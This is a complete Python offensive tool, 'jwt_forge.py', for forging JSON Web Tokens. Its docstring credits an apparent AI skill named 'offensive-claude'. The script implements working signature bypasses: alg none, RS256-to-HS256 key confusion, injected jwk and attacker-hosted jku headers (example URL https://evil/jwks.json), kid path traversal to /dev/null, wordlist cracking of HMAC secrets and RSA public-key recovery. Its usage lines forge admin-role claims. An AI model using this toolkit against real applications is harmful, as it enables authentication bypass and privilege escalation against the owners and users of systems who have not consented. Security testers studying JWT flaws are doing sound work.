#!/usr/bin/env python3
"""
jwt_forge.py - JWT/JOSE forgery toolkit (T1606.001, CWE-347).

Implements every common JWT signature-bypass:
  none       : {"alg":"none"} with empty signature
  confusion  : RS256->HS256 algorithm confusion (sign with public key as HMAC secret)
  jwk        : embed attacker public key in the header 'jwk'
  jku        : point 'jku' at an attacker-hosted JWKS URL
  kid        : 'kid' path-traversal / injection (e.g. ../../dev/null)
  crack      : offline crack of a weak HS256 secret (or use hashcat -m 16500)
  recover-pub: recover the RSA public key from two RS256 tokens (for confusion when the
               key isn't published)

Usage:
  python3 jwt_forge.py none      --claims '{"sub":"admin","role":"admin"}'
  python3 jwt_forge.py confusion --pubkey jwt_pub.pem --claims '{"role":"admin"}'
  python3 jwt_forge.py jwk       --claims '{"role":"admin"}'
  python3 jwt_forge.py jku       --claims '{"role":"admin"}' --jku https://evil/jwks.json
  python3 jwt_forge.py kid       --claims '{"role":"admin"}' --kid '../../dev/null'
  python3 jwt_forge.py crack token.jwt --wordlist rockyou.txt
  python3 jwt_forge.py recover-pub a.jwt b.jwt -o jwt_pub.pem

Dependencies: Python 3.8+. 'cryptography' for jwk/confusion-with-real-key/recover-pub.
Author: offensive-claude / crypto-analysis skill. Authorized engagements only.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys


def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")


def b64ud(s):
    s = s.encode() if isinstance(s, str) else s
    return base64.urlsafe_b64decode(s + b"=" * (-len(s) % 4))


def _hdr_payload(header: dict, claims: dict):
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(claims, separators=(",", ":")).encode())
    return h, p


def forge_none(claims):
    h, p = _hdr_payload({"alg": "none", "typ": "JWT"}, claims)
    return f"{h.decode()}.{p.decode()}."


def forge_confusion(claims, pubkey_path):
    key = open(pubkey_path, "rb").read()  # raw PEM bytes used as HMAC secret
    h, p = _hdr_payload({"alg": "HS256", "typ": "JWT"}, claims)
    signing_input = h + b"." + p
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return f"{h.decode()}.{p.decode()}.{b64u(sig).decode()}"


def forge_jwk(claims):
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = k.public_key().public_numbers()
    nlen = (pub.n.bit_length() + 7) // 8
    jwk = {
        "kty": "RSA",
        "kid": "attacker",
        "n": b64u(pub.n.to_bytes(nlen, "big")).decode(),
        "e": b64u(pub.e.to_bytes(3, "big")).decode(),
    }
    h, p = _hdr_payload({"alg": "RS256", "typ": "JWT", "jwk": jwk}, claims)
    si = h + b"." + p
    sig = k.sign(si, padding.PKCS1v15(), hashes.SHA256())
    return f"{h.decode()}.{p.decode()}.{b64u(sig).decode()}"


def forge_jku(claims, jku_url):
    """Forge a token whose 'jku' points at an attacker JWKS. Prints the JWKS to host."""
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes
    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = k.public_key().public_numbers()
    nlen = (pub.n.bit_length() + 7) // 8
    jwk = {"kty": "RSA", "kid": "attacker", "use": "sig", "alg": "RS256",
           "n": b64u(pub.n.to_bytes(nlen, "big")).decode(),
           "e": b64u(pub.e.to_bytes(3, "big")).decode()}
    h, p = _hdr_payload({"alg": "RS256", "typ": "JWT", "kid": "attacker", "jku": jku_url}, claims)
    si = h + b"." + p
    sig = k.sign(si, padding.PKCS1v15(), hashes.SHA256())
    token = f"{h.decode()}.{p.decode()}.{b64u(sig).decode()}"
    jwks = json.dumps({"keys": [jwk]}, indent=2)
    sys.stderr.write(f"[*] HOST this JWKS at {jku_url} :\n{jwks}\n")
    return token


def forge_kid(claims, kid):
    """kid injection: predictable key when kid -> empty file (e.g. ../../dev/null)."""
    # With kid pointing at an empty/known file, the HMAC key is empty bytes.
    h, p = _hdr_payload({"alg": "HS256", "typ": "JWT", "kid": kid}, claims)
    si = h + b"." + p
    sig = hmac.new(b"", si, hashlib.sha256).digest()  # empty key
    sys.stderr.write("[*] assumes kid resolves to empty/predictable key (empty HMAC secret)\n")
    return f"{h.decode()}.{p.decode()}.{b64u(sig).decode()}"


def crack(token, wordlist):
    parts = token.strip().split(".")
    if len(parts) != 3:
        sys.exit("[-] not a JWT")
    si = (parts[0] + "." + parts[1]).encode()
    target = b64ud(parts[2])
    header = json.loads(b64ud(parts[0]))
    alg = header.get("alg", "")
    if not alg.startswith("HS"):
        sys.exit(f"[-] crack only applies to HS* tokens (got {alg})")
    digest = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
              "HS512": hashlib.sha512}[alg]
    with open(wordlist, "rb") as f:
        for i, line in enumerate(f):
            secret = line.rstrip(b"\r\n")
            if hmac.new(secret, si, digest).digest() == target:
                print(f"[+] SECRET FOUND: {secret.decode(errors='replace')}")
                return
    print("[-] secret not in wordlist (try hashcat -m 16500)")


def recover_pub(jwt_a, jwt_b, out):
    """Recover RSA n from two RS256 signatures: n | gcd(s_a^e - h_a, s_b^e - h_b)."""
    from math import gcd
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
    except ImportError:
        sys.exit("[-] pip install cryptography")

    def parts(p):
        a = open(p).read().strip().split(".")
        si = (a[0] + "." + a[1]).encode()
        s = int.from_bytes(b64ud(a[2]), "big")
        h = int.from_bytes(hashlib.sha256(si).digest(), "big")
        # PKCS#1 v1.5 EMSA encoding prefix for SHA-256
        return s, h, si

    # Recovering modulus from RS256 requires the full EMSA-PKCS1v1.5 encoded message m.
    # m = 0x0001 FF..FF 00 || DigestInfo(SHA256) || H(si). Then n | (s^e - m).
    e = 65537
    def emsa(si, modlen=256):
        digest = hashlib.sha256(si).digest()
        di = bytes.fromhex("3031300d060960864801650304020105000420") + digest
        ps = b"\xff" * (modlen - len(di) - 3)
        return int.from_bytes(b"\x00\x01" + ps + b"\x00" + di, "big")

    for modlen in (256, 384, 512):  # 2048/3072/4096-bit keys
        sa = int.from_bytes(b64ud(open(jwt_a).read().strip().split(".")[2]), "big")
        sb = int.from_bytes(b64ud(open(jwt_b).read().strip().split(".")[2]), "big")
        sia = (".".join(open(jwt_a).read().strip().split(".")[:2])).encode()
        sib = (".".join(open(jwt_b).read().strip().split(".")[:2])).encode()
        ga = pow(sa, e) - emsa(sia, modlen)
        gb = pow(sb, e) - emsa(sib, modlen)
        n = gcd(ga, gb)
        if n.bit_length() in (2048, 3072, 4096) or (modlen * 8 - 8) <= n.bit_length() <= modlen * 8:
            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
            pub = _rsa.RSAPublicNumbers(e, n).public_key()
            pem = pub.public_bytes(serialization.Encoding.PEM,
                                   serialization.PublicFormat.SubjectPublicKeyInfo)
            open(out, "wb").write(pem)
            print(f"[+] recovered {n.bit_length()}-bit modulus -> {out}")
            return
    print("[-] could not recover modulus (try more token pairs / check alg is RS256)")


def main():
    ap = argparse.ArgumentParser(description="JWT/JOSE forgery toolkit")
    sub = ap.add_subparsers(dest="cmd", required=True)

    for name in ("none", "confusion", "jwk", "jku", "kid"):
        p = sub.add_parser(name)
        p.add_argument("--claims", required=True, help="JSON claims object")
        if name == "confusion":
            p.add_argument("--pubkey", required=True)
        if name == "jku":
            p.add_argument("--jku", required=True)
        if name == "kid":
            p.add_argument("--kid", required=True)

    p_c = sub.add_parser("crack")
    p_c.add_argument("token"); p_c.add_argument("--wordlist", required=True)

    p_r = sub.add_parser("recover-pub")
    p_r.add_argument("jwt_a"); p_r.add_argument("jwt_b"); p_r.add_argument("-o", required=True)

    args = ap.parse_args()

    if args.cmd == "crack":
        crack(open(args.token).read(), args.wordlist)
        return
    if args.cmd == "recover-pub":
        recover_pub(args.jwt_a, args.jwt_b, args.o)
        return

    claims = json.loads(args.claims)
    if args.cmd == "none":
        tok = forge_none(claims)
    elif args.cmd == "confusion":
        tok = forge_confusion(claims, args.pubkey)
    elif args.cmd == "jwk":
        tok = forge_jwk(claims)
    elif args.cmd == "jku":
        tok = forge_jku(claims, args.jku)
    elif args.cmd == "kid":
        tok = forge_kid(claims, args.kid)
    print(tok)


if __name__ == "__main__":
    main()
